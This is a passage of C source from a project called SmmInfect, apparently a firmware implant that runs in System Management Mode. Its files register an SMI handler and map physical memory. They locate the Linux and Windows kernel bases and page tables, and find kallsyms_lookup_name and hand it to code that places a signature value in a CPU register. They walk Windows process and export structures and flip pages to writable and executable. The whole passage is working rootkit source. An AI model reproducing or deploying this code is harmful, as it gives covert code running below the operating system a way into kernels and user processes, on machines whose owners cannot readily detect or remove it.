    // Make sure we are not running into a cache side channel attack. When the system leaves SMM it might clear cache.
    //ClearCache();

    return EFI_SUCCESS;
}

EFI_STATUS EFIAPI UefiMain(IN EFI_HANDLE image, IN EFI_SYSTEM_TABLE* table)
{
    gRT = table->RuntimeServices;
    gBS = table->BootServices;
    gST = table;
    SERIAL_INIT();

    if (EFI_ERROR(gBS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, 0, (void**)&SmmBase2)))
    {
        SERIAL_PRINT("Failed to find SmmBase!\r\n");
        return EFI_SUCCESS;
    }

    if (EFI_ERROR(SmmBase2->GetSmstLocation(SmmBase2, &GSmst2)))
    {
        SERIAL_PRINT("Failed to find smst!\r\n");
        return EFI_SUCCESS;
    }

    //Register root handler
    EFI_HANDLE handle;
    GSmst2->SmiHandlerRegister(&SmiHandler, NULL, &handle);

    if (EFI_ERROR(SetupMemory(GSmst2)))
    {
        SERIAL_PRINT("Failed to setup memory\r\n");
        return EFI_ERROR_MAJOR;
    }

    SERIAL_PRINT("Handler registered!\r\n");

    return  EFI_SUCCESS;
}

```

`SmmInfect/linux.c`:

```c
#include <Library/BaseLib.h>
#include "linux.h"
#include "memory.h"
#include "serial.h"

static EFI_SMM_CPU_PROTOCOL* Cpu = NULL;
static EFI_SMM_SYSTEM_TABLE2* GSmst2 = NULL;
static BOOLEAN SetupDone = FALSE;
static UINT64 KernelCr3 = 0;
static UINT64 KernelBase = 0;
static UINT8 KallsymsPattern[] = { 0x8B, 0x04, 0x25, 0x69, 0x69, 0x69, 0x69, 0x48, 0x89, 0x45, 0xf0, 0x31,0xc0, 0x80, 0x3f, 0x00, 0xc7 };
static KallsymsLookupName KallsymsLookUpName = NULL;

EFI_STATUS SetupLinux(EFI_SMM_CPU_PROTOCOL* cpu, EFI_SMM_SYSTEM_TABLE2* smst)
{
    SERIAL_PRINT("Trying to setup linux \r\n", );

    if (SetupDone == TRUE)
    {
        return EFI_SUCCESS;
    }

    if (cpu == NULL || smst == NULL)
    {
        return EFI_INVALID_PARAMETER;
    }
    Cpu = cpu;
    GSmst2 = smst;

    EFI_STATUS status = GetLinuxKernelCr3(&KernelCr3);
    if (EFI_ERROR(status))
    {
        SERIAL_PRINT("Failed to find linux cr3 %llx \r\n", status);
        return status;
    }

    status = GetLinuxKernelBase(&KernelBase);
    if (EFI_ERROR(status))
    {
        SERIAL_PRINT("Failed to find linux base %llx \r\n", status);
        return status;
    }

    volatile KallsymsLookupName kallsyms = FindLinuxKallsymsLookupName(KernelBase);
    SERIAL_PRINT("Kallsyms %llx \r\n", kallsyms);

    if (kallsyms == NULL)
    {
        SERIAL_PRINT("Failed to find linux kallsyms %llx \r\n", status);
        return EFI_NOT_FOUND;
    }

    KallsymsLookUpName = kallsyms;
    SERIAL_PRINT("Found kallsyms %llx \r\n", KallsymsLookUpName);
    UINT64 rax;
    for (UINT16 i = 0; i < GSmst2->NumberOfCpus; i++)
    {
        Cpu->ReadSaveState(Cpu, sizeof(rax), EFI_SMM_SAVE_STATE_REGISTER_R12, i, (VOID*)&rax);

        if (rax == 0x4848484848484848)
        {
            SERIAL_PRINT("Found signature!!\r\n");
            rax = (UINT64)KallsymsLookUpName;
            Cpu->WriteSaveState(Cpu, sizeof(rax), EFI_SMM_SAVE_STATE_REGISTER_R12, i, (VOID*)&rax);
            SetupDone = TRUE;
        }
    }

    return EFI_SUCCESS;
}

EFI_STATUS GetLinuxKernelBase(UINT64* base)
{
    if (base == NULL)
    {
        return EFI_INVALID_PARAMETER;
    }

    /*
    UINT64 idt = 0; [https://www.amd.com/content/dam/amd/en/documents/processor-tech-docs/programmer-references/24593.pdf] chap 10.21
    EFI_STATUS status = GetIdtBase(&idt);
    PKIDTENTRY64 entry = (PKIDTENTRY64)(idt + (0xE * 16));  // (#PF);
    UINT64 pf = entry->idt.offsets.offsetlow | ((UINT64)entry->idt.offsets.offsetmiddle << 16) | ((UINT64)entry->idt.offsets.offsethigh << 32);
    */

    UINT64 entry = __readmsr(0xC0000082);

    if (entry == 0)
    {
        return EFI_NOT_FOUND;
    }

    // Align 1MB
    UINT64 kernel = entry & 0xFFFFFFFFFFF00000;
    kernel -= 0x1400000;

    *base = kernel;

    return EFI_SUCCESS;
}

EFI_STATUS GetLinuxKernelCr3(UINT64* cr3)
{
    if (cr3 == NULL)
    {
        return EFI_INVALID_PARAMETER;
    }

    UINT64 tempcr3;
    EFI_STATUS status = Cpu->ReadSaveState(Cpu, sizeof(tempcr3), EFI_SMM_SAVE_STATE_REGISTER_CR3, GSmst2->CurrentlyExecutingCpu, (VOID*)&tempcr3);

    if (EFI_ERROR(status) || tempcr3 == 0 || tempcr3 == AsmReadCr3())
    {
        return EFI_NOT_FOUND;
    }

    *cr3 = tempcr3;

    return EFI_SUCCESS;
}

KallsymsLookupName FindLinuxKallsymsLookupName(UINT64 base)
{
    UINT32 i;
    UINT32 j;
    BOOLEAN found = FALSE;
    UINT64 kaddr = base;

    for (i = 0x0; i < 0x200000; i++)
    {
        for (j = 0; j < sizeof(KallsymsPattern); j++)
        {
            if (KallsymsPattern[j] == 0x69)
            {
                found = TRUE;
                continue;
            }
            UINT8 byte = ReadVirtual8(kaddr + j, KernelCr3);
            //UINT8 byte = ReadPhysical8(TranslateVirtualToPhysical(KernelCr3, (kaddr + j)));

            if (byte != KallsymsPattern[j])
            {
                found = FALSE;
                break;
            }
            else
            {
                found = TRUE;
            }

        }
        if (found == TRUE)
        {
            return (KallsymsLookupName)(kaddr - 0x10);
        }


        kaddr += 0x10;
    }

    return NULL;
}

KallsymsLookupName GetKallsyms()
{
    return KallsymsLookUpName;
}

```

`SmmInfect/linux.h`:

```h
#pragma once
#include <Uefi.h>
#include <Protocol/SmmBase2.h>
#include <PiSmm.h>
#include <Protocol/SmmCpu.h>
typedef UINT64 (*KallsymsLookupName)(const char *name);
EFI_STATUS SetupLinux(EFI_SMM_CPU_PROTOCOL* cpu, EFI_SMM_SYSTEM_TABLE2* smst);

EFI_STATUS GetLinuxKernelBase(UINT64* base);
EFI_STATUS GetLinuxKernelCr3(UINT64* cr3);
KallsymsLookupName FindLinuxKallsymsLookupName(UINT64 base);
KallsymsLookupName GetKallsyms();
```

`SmmInfect/memory.c`:

```c
#include "memory.h"
#include "windows.h"
#include "serial.h"
#include <Library/UefiBootServicesTableLib.h>
#include <Library/BaseLib.h>
#include <Library/CpuLib.h>

static UINT64 map_begin = 0;
static UINT64 map_end = 0;
static BOOLEAN setup_done = FALSE;
static EFI_SMM_SYSTEM_TABLE2* GSmst2;
static EFI_PHYSICAL_ADDRESS pml4_phys, pdpt_phys, pd_phys, pt_phys;
EFI_STATUS MapPhysicalMemory();

UINT8* ReadPhysical(UINT64 address, UINT8* buffer, UINT64 length)
{
    if (!IsAddressValid(address))
        return NULL;

    for (UINT64 i = 0; i < length; ++i)
    {
        buffer[i] = *(UINT8*)(address + i);
    }

    return buffer;
}

UINT8 ReadPhysical8(UINT64 address)
{
    return !IsAddressValid(address) ? 0 : *(UINT8*)address;
}

UINT16 ReadPhysical16(UINT64 address)
{
    return !IsAddressValid(address) ? 0 : *(UINT16*)address;
}

UINT32 ReadPhysical32(UINT64 address)
{
    return !IsAddressValid(address) ? 0 : *(UINT32*)address;
}

UINT64 ReadPhysical64(UINT64 address)
{
    return !IsAddressValid(address) ? 0 : *(UINT64*)address;
}

void* ZMemSet(void* ptr, int value, UINT64 num)
{
    unsigned char* p = (unsigned char*)ptr;
    while (num--)
    {
        *p++ = (unsigned char)value;
    }
    return ptr;
}

void ZMemCpy(UINT8* src, UINT8* dst, UINT64 len)
{
  for(UINT64 i = 0; i < len; ++i)
  {
    dst[i] = src[i];
  }
}


// Clamp the virtual read to bounderies of page size.
UINT8* ReadVirtual(UINT64 address, UINT64 cr3, UINT8* buffer, UINT64 length)
{
    if (buffer == NULL)
        return NULL;

    UINT64 remaining_size = length;
    UINT64 offset = 0;

    while (remaining_size > 0)
    {
        UINT64 physical_address = TranslateVirtualToPhysical(cr3, address + offset);
        UINT64 page_offset = physical_address & 0xFFF;
        UINT64 current_size = 0x1000 - page_offset;

        if (current_size > remaining_size)
        {
            current_size = remaining_size;
        }

        if (!physical_address)
        {
            ZMemSet(buffer + offset, 0, current_size);
        }
        else
        {
            if (!ReadPhysical(physical_address, buffer + offset, current_size))
            {
                break;
            }
        }

        offset += current_size;
        remaining_size -= current_size;
    }

    return buffer;
}

UINT8 ReadVirtual8(UINT64 address, UINT64 cr3)
{
    UINT8 value = 0;
    ReadVirtual(address, cr3, &value, sizeof(value));
    return value;
}

UINT16 ReadVirtual16(UINT64 address, UINT64 cr3)
{
    UINT16 value = 0;
    ReadVirtual(address, cr3, (UINT8*)&value, sizeof(value));
    return value;
}

UINT32 ReadVirtual32(UINT64 address, UINT64 cr3)
{
    UINT32 value = 0;
    ReadVirtual(address, cr3, (UINT8*)&value, sizeof(value));
    return value;
}
UINT64 ReadVirtual64(UINT64 address, UINT64 cr3)
{
    UINT64 value = 0;
    ReadVirtual(address, cr3, (UINT8*)&value, sizeof(value));
    return value;
}

EFI_STATUS SetupMemoryMap()
{
    UINT32 descriptor_version;
    UINTN memory_map_size = 0;
    EFI_MEMORY_DESCRIPTOR* memory_map = NULL;
    UINTN map_key;
    UINTN descriptor_size;
    EFI_STATUS status;

    status = gBS->GetMemoryMap(&memory_map_size, memory_map, &map_key, &descriptor_size, &descriptor_version);
    if (status == EFI_INVALID_PARAMETER || status == EFI_SUCCESS)
    {
        return EFI_ACCESS_DENIED;
    }

    status = gBS->AllocatePool(EfiBootServicesData, memory_map_size, (VOID**)&memory_map);

    if (EFI_ERROR(status))
    {
        return status;
    }

    status = gBS->GetMemoryMap(&memory_map_size, memory_map, &map_key, &descriptor_size, &descriptor_version);
    if (EFI_ERROR(status))
    {
        gBS->FreePool(memory_map);
    }

    UINT64 max_end = 0;
    EFI_MEMORY_DESCRIPTOR* desc = memory_map;

    for (UINT64 i = 0; i < memory_map_size / descriptor_size; ++i) 
    {
        UINT64 region_end = desc->PhysicalStart + (desc->NumberOfPages * 0x1000);
        if (region_end > max_end) 
        {
            max_end = region_end;
        }

        desc = (EFI_MEMORY_DESCRIPTOR*)((UINT8*)desc + descriptor_size);
    }

    gBS->FreePool(memory_map);
    map_end = max_end;
    return EFI_SUCCESS;
}

BOOLEAN IsAddressValid(UINT64 address)
{
    return !(address < map_begin || address > map_end);
}

UINT64 TranslateVirtualToPhysical(UINT64 targetcr3, UINT64 address)
{
    UINT16 pml4_idx = ((UINT64)address >> 39) & 0x1FF;
    UINT16 pdpt_idx = ((UINT64)address >> 30) & 0x1FF;
    UINT16 pd_idx   = ((UINT64)address >> 21) & 0x1FF;
    UINT16 pt_idx   = ((UINT64)address >> 12) & 0x1FF;

    pml4e_64* pml4_arr = (pml4e_64*)(targetcr3 + 8 * pml4_idx);
    if(!pml4_arr->bits.present) return 0;
    pdpte_64* pdpt_arr = (pdpte_64*)((pml4_arr->bits.page_frame_number << 12) + 8 * pdpt_idx);
    if(!pdpt_arr->bits.present) return 0;
    pde_64* pd_arr = (pde_64*)((pdpt_arr->bits.page_frame_number << 12) + 8 * pd_idx);
    if(!pd_arr->bits.present) return 0;
    if(pd_arr->bits.large_page) return ((UINT64)(address & 0x1FFFFF) + (*(UINT64*)pd_arr & 0xFFFFFFFFF000));
    pte_64* pt_arr = (pte_64*)((pd_arr->bits.page_frame_number << 12) + 8 * pt_idx);
    if(!pt_arr->bits.present) return 0;
    return (address & 0xFFF) + (*(UINT64*)pt_arr & 0xFFFFFFFFF000);
}

EFI_STATUS MapPhysicalMemory()
{
    for (UINT64 addr = map_begin; addr < map_end; addr += SIZE_2MB)
    {
        UINT16 pml4_idx = ((UINT64)addr >> 39) & 0x1FFu;
        UINT16 pdpt_idx = ((UINT64)addr >> 30) & 0x1FFu;
        UINT16 pd_idx   = ((UINT64)addr >> 21) & 0x1FFu;
        cr3 ctx;

        ctx.flags = AsmReadCr3();
        pml4e_64* pml4 = (pml4e_64*)(ctx.bits.address_of_page_directory << 12);

        if (!(pml4[pml4_idx].bits.present))
        {
            EFI_PHYSICAL_ADDRESS alloc = (EFI_PHYSICAL_ADDRESS)-1;
            GSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &alloc);

            if ((alloc & 0xFFFu) != 0u)
            {
                return EFI_NO_MAPPING;
            }

            ZMemSet((void*)alloc, 0, SIZE_4KB);
            pml4[pml4_idx].bits.page_frame_number = alloc >> 12;
        }

        pml4[pml4_idx].bits.present = 1u;
        pml4[pml4_idx].bits.write = 1u;
        pml4[pml4_idx].bits.execute_disable = 0u;

        pdpte_64* pdpt = (pdpte_64*)(pml4[pml4_idx].bits.page_frame_number << 12);

        if (!(pdpt[pdpt_idx].bits.present))
        {
            EFI_PHYSICAL_ADDRESS alloc = (EFI_PHYSICAL_ADDRESS)-1;
            GSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData, 1, &alloc);

            if ((alloc & 0xFFFu) != 0u)
            {
                return EFI_NO_MAPPING;
            }

            ZMemSet((void*)alloc, 0, SIZE_4KB);
            pdpt[pdpt_idx].bits.page_frame_number = alloc >> 12;
        }

        pdpt[pdpt_idx].bits.present = 1u;
        pdpt[pdpt_idx].bits.write = 1u;
        pdpt[pdpt_idx].bits.execute_disable = 0u;

        pde_64* pd = (pde_64*)(pdpt[pdpt_idx].bits.page_frame_number << 12);

        pd[pd_idx].bits.present = 1u;
        pd[pd_idx].bits.write = 1u;
        pd[pd_idx].bits.execute_disable = 0u;
        pd[pd_idx].bits.page_frame_number = addr >> 12;
        pd[pd_idx].bits.large_page = 1u;

    }

    CpuFlushTlb();

    return EFI_SUCCESS;
}

//This function does not currently work. It works on linx and windows but when porting to smm it fails.
UINT64 TranslatePhysicalToVirtual(UINT64 targetcr3, UINT64 address)
{
    if(targetcr3 == AsmReadCr3()) return 0;

    cr3 ctx;

    ctx.flags = targetcr3;
    UINT64 physical_addr = ctx.bits.address_of_page_directory << 12;

    pml4e_64* pml4 = (pml4e_64*)pml4_phys;
    pdpte_64* pdpt = (pdpte_64*)pdpt_phys;
    pde_64* pd = (pde_64*)pd_phys;
    pte_64* pt = (pte_64*)pt_phys;

    ReadPhysical(physical_addr, (UINT8*)pml4, 512 * sizeof(pml4e_64));

    for (UINT64 pml4_i = 0; pml4_i < 512; pml4_i++) {
        if (!pml4[pml4_i].bits.present) continue;

        physical_addr = pml4[pml4_i].bits.page_frame_number << 12;
        ReadPhysical(physical_addr, (UINT8*)pdpt, 512 * sizeof(pdpte_64));

        for (UINT64 pdpt_i = 0; pdpt_i < 512; pdpt_i++) {
            if (!pdpt[pdpt_i].bits.present || pdpt[pdpt_i].bits.large_page) continue;

            physical_addr = pdpt[pdpt_i].bits.page_frame_number << 12;
            ReadPhysical(physical_addr, (UINT8*)pd, 512 * sizeof(pde_64));

            for (UINT64 pde_i = 0; pde_i < 512; pde_i++) {
                if (!pd[pde_i].bits.present || pd[pde_i].bits.large_page) continue;

                physical_addr = pd[pde_i].bits.page_frame_number << 12;
                ReadPhysical(physical_addr, (UINT8*)pt, 512 * sizeof(pte_64));

                for (UINT64 pte_i = 0; pte_i < 512; pte_i++) {
                    if (!pt[pte_i].bits.present) continue;

                    UINT64 page_phys = pt[pte_i].bits.page_frame_number << 12;
                    UINT64 virtual = (pml4_i << 39) | (pdpt_i << 30) | (pde_i << 21) | (pte_i << 12);

                    if (virtual & (1ull << 47)) virtual |= 0xFFFF000000000000ull;

                    if ((address & ~0xFFF) == (page_phys & ~0xFFF)) {
                        SERIAL_PRINT("Translation worked!\r\n");

                        return virtual + (address & 0xFFF);
                    }
                }
            }
        }
    }

    return 0;
}


void SetRwx(UINT64 address, UINT64 targetcr3)
{
  UINT16 pml4_idx = ((UINT64)address >> 39) & 0x1FF;
  UINT16 pdpt_idx = ((UINT64)address >> 30) & 0x1FF;
  UINT16 pd_idx   = ((UINT64)address >> 21) & 0x1FF;
  UINT16 pt_idx   = ((UINT64)address >> 12) & 0x1FF;

  pml4e_64* pml4_arr = (pml4e_64*)(targetcr3 + 8 * pml4_idx);
  if(!pml4_arr->bits.present) return;
  pdpte_64* pdpt_arr = (pdpte_64*)((pml4_arr->bits.page_frame_number << 12) + 8 * pdpt_idx);
  if(!pdpt_arr->bits.present) return;
  pde_64* pd_arr = (pde_64*)((pdpt_arr->bits.page_frame_number << 12) + 8 * pd_idx);
  if(!pd_arr->bits.present) return;
  if(pd_arr->bits.large_page)
  {
    pd_arr->bits.write = 1;
    pd_arr->bits.execute_disable = 0;
    return;
  } 

  pte_64* pt_arr = (pte_64*)((pd_arr->bits.page_frame_number << 12) + 8 * pt_idx);
  if(!pt_arr->bits.present) return;
  pt_arr->bits.write = 1;
  pt_arr->bits.execute_disable = 0;
}


EFI_STATUS SetupMemory(EFI_SMM_SYSTEM_TABLE2* smst)
{
    if (setup_done == TRUE)
    {
        return EFI_SUCCESS;
    }

    if (smst == NULL)
    {
        return EFI_INVALID_PARAMETER;
    }
    GSmst2 = smst;

    if(SetupMemoryMap() != EFI_SUCCESS)
    {
      return EFI_NOT_FOUND;
    }

    if(MapPhysicalMemory() != EFI_SUCCESS)
    {
      SERIAL_PRINT("Mapping physical memory error!\r\n");
      return EFI_NOT_FOUND;
    }

    EFI_STATUS status;
    status = GSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData,
                                      EFI_SIZE_TO_PAGES(512 * sizeof(pml4e_64)), &pml4_phys);
    if (status != EFI_SUCCESS) {
        SERIAL_PRINT("Failed alloc pml4: %llx\r\n", status);
        while(1){}; // Something is wrong outside of our control. Make pc not startable
    }

    status = GSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData,
                                      EFI_SIZE_TO_PAGES(512 * sizeof(pdpte_64)), &pdpt_phys);
    if (status != EFI_SUCCESS) {
        SERIAL_PRINT("Failed alloc pdpt: %llx\r\n", status);
        while(1){}; // Something is wrong outside of our control. Make pc not startable
    }

    status = GSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData,
                                      EFI_SIZE_TO_PAGES(512 * sizeof(pde_64)), &pd_phys);
    if (status != EFI_SUCCESS) {
        SERIAL_PRINT("Failed alloc pd: %llx\r\n", status);
        while(1){}; // Something is wrong outside of our control. Make pc not startable
    }

    status = GSmst2->SmmAllocatePages(AllocateAnyPages, EfiRuntimeServicesData,
                                      EFI_SIZE_TO_PAGES(512 * sizeof(pte_64)), &pt_phys);
    if (status != EFI_SUCCESS) {
        SERIAL_PRINT("Failed alloc pte: %llx\r\n", status);
        while(1){}; // Something is wrong outside of our control. Make pc not startable
    }
    
    setup_done = TRUE;

    return EFI_SUCCESS;
}

UINT64 FindNearestCoffImage(UINT64 entry, UINT64 targetcr3)
{
  entry = entry & ~(SIZE_4KB -1);

  UINTN i = 0;
  for(i = 0; i < 500; ++i)
  {
    UINT16 magic = ReadVirtual16(entry - (SIZE_4KB * i), targetcr3);

    if(magic == 0x5A4D)
    {
      return (entry - (SIZE_4KB * i));
    }
  }

  return 0;
}

UINT64 FindNearestCoffImagePhys(UINT64 entry)
{
  entry = entry & ~(SIZE_4KB -1);

  UINTN i = 0;
  for(i = 0; i < 500; ++i)
  {
    UINT16 magic = ReadPhysical16(entry + (SIZE_4KB * i));

    if(magic == 0x5A4D)
    {
      return (entry + (SIZE_4KB * i));
    }
  }

  return 0;
}

```

`SmmInfect/memory.h`:

```h
#pragma once

#include <Uefi.h>
#include <Protocol/SmmBase2.h>
#include <PiSmm.h>
#include <Protocol/SmmCpu.h>

// #define Linux UNSUPPORTED

void* ZMemSet(void* ptr, int value, UINT64 num);
void ZMemCpy(UINT8* src, UINT8* dst, UINT64 len);
EFI_STATUS SetupMemoryMap();
BOOLEAN IsAddressValid(UINT64 address);
EFI_STATUS SetupMemory(EFI_SMM_SYSTEM_TABLE2* smst);
UINT64 TranslateVirtualToPhysical(UINT64 targetcr3, UINT64 address);
UINT64 TranslatePhysicalToVirtual(UINT64 targetcr3, UINT64 address);

UINT64 FindNearestCoffImage(UINT64 entry, UINT64 targetcr3);
UINT64 FindNearestCoffImagePhys(UINT64 entry);
void SetRwx(UINT64 address, UINT64 targetcr3);

//
// Physical memory
//
UINT8* ReadPhysical(UINT64 address, UINT8* buffer, UINT64 length);
UINT8 ReadPhysical8(UINT64 address);
UINT16 ReadPhysical16(UINT64 address);
UINT32 ReadPhysical32(UINT64 address);
UINT64 ReadPhysical64(UINT64 address);

//
// Virtual memory
//
UINT8* ReadVirtual(UINT64 address, UINT64 cr3, UINT8* buffer, UINT64 length);
UINT8 ReadVirtual8(UINT64 address, UINT64 cr3);
UINT16 ReadVirtual16(UINT64 address, UINT64 cr3);
UINT32 ReadVirtual32(UINT64 address, UINT64 cr3);
UINT64 ReadVirtual64(UINT64 address, UINT64 cr3);

typedef union
{
    struct
    {
        UINT64 reserved1 : 3;
        UINT64 page_level_write_through : 1;
        UINT64 page_level_cache_disable : 1;
        UINT64 reserved2 : 7;

        UINT64 address_of_page_directory : 36;
        UINT64 reserved3 : 16;
    }bits;

    UINT64 flags;
} cr3;

typedef union
{
    struct
    {
        UINT64 present : 1;
        UINT64 write : 1;
        UINT64 supervisor : 1;
        UINT64 page_level_write_through : 1;
        UINT64 page_level_cache_disable : 1;
        UINT64 accessed : 1;
        UINT64 reserved1 : 1;
        UINT64 must_be_zero : 1;
        UINT64 ignored_1 : 4;
        UINT64 page_frame_number : 36;
        UINT64 reserved2 : 4;
        UINT64 ignored_2 : 11;
        UINT64 execute_disable : 1;
    } bits;

    UINT64 flags;
} pml4e_64;

typedef union
{
    struct
    {
        UINT64 present : 1;
        UINT64 write : 1;
        UINT64 supervisor : 1;
        UINT64 page_level_write_through : 1;
        UINT64 page_level_cache_disable : 1;
        UINT64 accessed : 1;
        UINT64 reserved1 : 1;
        UINT64 large_page : 1;
        UINT64 ignored_1 : 4;
        UINT64 page_frame_number : 36;
        UINT64 reserved2 : 4;
        UINT64 ignored_2 : 11;
        UINT64 execute_disable : 1;
    } bits;

    UINT64 flags;
} pdpte_64;

typedef union
{
    struct
    {
        UINT64 present : 1;
        UINT64 write : 1;
        UINT64 supervisor : 1;
        UINT64 page_level_write_through : 1;
        UINT64 page_level_cache_disable : 1;
        UINT64 accessed : 1;
        UINT64 reserved1 : 1;
        UINT64 large_page : 1;
        UINT64 ignored_1 : 4;
        UINT64 page_frame_number : 36;
        UINT64 reserved2 : 4;
        UINT64 ignored_2 : 11;
        UINT64 execute_disable : 1;
    } bits;

    UINT64 flags;
} pde_64;

typedef union
{
    struct
    {
        UINT64 present : 1;
        UINT64 write : 1;
        UINT64 supervisor : 1;
        UINT64 page_level_write_through : 1;
        UINT64 page_level_cache_disable : 1;
        UINT64 accessed : 1;
        UINT64 dirty : 1;
        UINT64 pat : 1;
        UINT64 global : 1;
        UINT64 ignored_1 : 3;
        UINT64 page_frame_number : 36;
        UINT64 reserved1 : 4;
        UINT64 ignored_2 : 7;
        UINT64 protection_key : 4;
        UINT64 execute_disable : 1;
    } bits;
    UINT64 flags;
} pte_64;

```

`SmmInfect/serial.c`:

```c
#include "serial.h"

// Implement own debugging prints

```

`SmmInfect/serial.h`:

```h
#include <Uefi.h>
#include <stdarg.h>
#include <stddef.h>
#define SERIAL_INIT()
#define SERIAL_PRINT(x, ...)

// Implement own debugging prints
```

`SmmInfect/string.c`:

```c
#include "string.h"

int ToLower(int c)
{
    return (c >= 'A' && c <= 'Z') ? (c + 'a' - 'A') : c;
}

int StrCmpi(const char* str1, const char* str2)
{
    while (*str1 && (ToLower(*str1) == ToLower(*str2)))
    {
        str1++;
        str2++;
    }
    return *(const unsigned char*)str1 - *(const unsigned char*)str2;
}

int WcsCmpi(const unsigned short* str1, const unsigned short* str2)
{
    while (*str1 && (ToLower(*str1) == ToLower(*str2)))
    {
        str1++;
        str2++;
    }
    return *(const unsigned short*)str1 - *(const unsigned short*)str2;
}

```

`SmmInfect/string.h`:

```h
int ToLower(int c);
int StrCmpi(const char* str1, const char* str2);
int WcsCmpi(const unsigned short* str1, const unsigned short* str2);

```

`SmmInfect/windows.c`:

```c
#include "windows.h"
#include "memory.h"
#include "string.h"
static UINT64 KernelCr3 = 0;
static UINT64 KernelBase = 0;
static UINT64 PsInitialSystemProcess;
static UINT64 PsGetProcessExitProcessCalled = 0;
static UINT64 PsGetProcessImageFileName = 0;
static UINT64 ActiveProcessLinks = 0;
static UINT64 PsGetProcessPeb = 0;
static UINT64 PsGetProcessSectionBaseAddress = 0;
static BOOLEAN SetupDone = FALSE;
static EFI_SMM_CPU_PROTOCOL* Cpu;
static EFI_SMM_SYSTEM_TABLE2* GSmst2;
static EFI_STATUS MemGetKernelCr3(UINT64* cr3);
static EFI_STATUS MemGetKernelBase(UINT64* base);

UINT64 ZGetWindowsProcAddressX64(UINT64 cr3, UINT64 base, const char* export_name)
{
    INT64 v4;
    UINT32 v5;
    UINT32* v6;
    INT64 v7;
    UINT32* v8;
    UINT32 v9;
    INT64 v10;

    if (ReadVirtual16(base, cr3) != 23117)
    {
        return 0;
    }

    v4 = ReadVirtual32(base + 60, cr3);
    if (ReadVirtual32(v4 + base, cr3) != 17744)
    {
        return 0;
    }

    v5 = 0;
    v6 = (UINT32*)(base + ReadVirtual32(v4 + base + 136, cr3));
    v7 = base + (UINT32)ReadVirtual32((UINT64)v6 + sizeof(UINT32) * 7, cr3);
    v8 = (UINT32*)(base + (UINT32)ReadVirtual32((UINT64)v6 + sizeof(UINT32) * 8, cr3));
    v9 = ReadVirtual32((UINT64)v6 + sizeof(UINT32) * 6, cr3);
    v10 = base + (UINT32)ReadVirtual32((UINT64)v6 + sizeof(UINT32) * 9, cr3);
    if (!v9)
    {
        return 0;
    }

    unsigned char name[50] = { 0 };

    ReadVirtual(base + ReadVirtual32((UINT64)v8, cr3), cr3, (UINT8*)name, (UINT64)sizeof(name));
    name[49] = 0;

    while (StrCmpi((char*)name, export_name))
    {
        ++v5;
        ++v8;
        if (v5 >= v9)
        {
            return 0;
        }

        ReadVirtual(base + (UINT64)ReadVirtual32((UINT64)v8, cr3), cr3, (UINT8*)name, (UINT64)sizeof(name));
        name[49] = 0;
    }
    return base + ReadVirtual32(v7 + 4 * ReadVirtual16(v10 + 2 * (INT32)v5, cr3), cr3);
}

UINT64 GetWindowsBaseAddressModuleX64(UINT64 eprocess, unsigned short* process_name)
{
    UINT64* v3;
    UINT64* i;

    UINT64 cr3 = GetWindowsProcessCr3(eprocess);
    UINT64 a1 = GetWindowsProcessPEB(eprocess);

    v3 = (UINT64*)((UINT64)ReadVirtual64(a1 + 24, cr3) + 32);
    for (i = (UINT64*)ReadVirtual64((UINT64)v3, cr3);; i = (UINT64*)ReadVirtual64((UINT64)i, cr3))
    {
        if (i == v3)
        {
            return 0;
        }

        unsigned short name[30];
        ReadVirtual(ReadVirtual64((UINT64)i + (UINT64)sizeof(UINT64) * 10, cr3), cr3, (UINT8*)name, sizeof(name));

        if (!(unsigned int)WcsCmpi(name, process_name))
        {
            break;
        }
    }

    return ReadVirtual64((UINT64)i + sizeof(UINT64) * 4, cr3);
}

UINT64 GetWindowsSectionBaseAddressX64(UINT64 eprocess, UINT64 module_base, unsigned char* section_name)
{
    INT64 v4;
    INT32 v5;
    INT32 v6;
    INT64 v7;
    UINT64 cr3 = GetWindowsProcessCr3(eprocess);

    if (ReadVirtual16(module_base, cr3) != 23117)
        return 0;
    v4 = module_base + ReadVirtual32(module_base + 60, cr3);
    if (ReadVirtual32(v4, cr3) != 17744)
        return 0;
    v5 = 0;
    v6 = ReadVirtual16(v4 + 6, cr3);
    v7 = v4 + ReadVirtual16(v4 + 20, cr3) + 24;
    if (!ReadVirtual16(v4 + 6, cr3))
        return 0;

    char* name[8] = { 0 };
    ReadVirtual(v7, cr3, (UINT8*)name, sizeof(name));
    while (StrCmpi((const char*)name, (const char*)section_name))
    {
        ++v5;
        v7 += 40;
        if (v5 >= v6)
            return 0;

        ReadVirtual(v7, cr3, (UINT8*)name, sizeof(name));
    }
    return module_base + ReadVirtual32(v7 + 12, cr3);
}

UINT64 GetWindowsKernelBase()
{
    if (EFI_ERROR(SetupWindows(Cpu, GSmst2)))
    {
        return 0;
    }

    return KernelBase;
}

UINT64 GetWindowsKernelCr3()
{
    if (EFI_ERROR(SetupWindows(Cpu, GSmst2)))
    {
        return 0;
    }

    return KernelCr3;
}

UINT64 GetWindowsProcessCr3(UINT64 eprocess)
{
    // _EPROCESS -> _KPROCESS -> 0x28;
    return ReadVirtual64(eprocess + 0x28, KernelCr3);
}

UINT64 GetWindowsProcessPEB(UINT64 eprocess)
{
    return ReadVirtual64(eprocess + PsGetProcessPeb, KernelCr3);
}

UINT64 GetWindowsProcessBaseAddress(UINT64 eprocess)
{
    return ReadVirtual64(eprocess + PsGetProcessSectionBaseAddress, KernelCr3);
}

EFI_STATUS SetupWindows(EFI_SMM_CPU_PROTOCOL* cpu, EFI_SMM_SYSTEM_TABLE2* smst)
{
    
    if (SetupDone == TRUE)
    {
        return EFI_SUCCESS;
    }

    if (cpu == NULL || smst == NULL)
    {
        return EFI_INVALID_PARAMETER;
    }
    Cpu = cpu;
    GSmst2 = smst;

    EFI_STATUS status = MemGetKernelCr3(&KernelCr3);
    if (EFI_ERROR(status))
    {
        return EFI_NOT_FOUND;
    }

    status = MemGetKernelBase(&KernelBase);
    if (EFI_ERROR(status))
    {
        return EFI_NOT_FOUND;
    }

    PsInitialSystemProcess = ZGetWindowsProcAddressX64(KernelCr3, KernelBase, "PsInitialSystemProcess");
    if (PsInitialSystemProcess == 0)
    {
        return EFI_NOT_FOUND;
    }

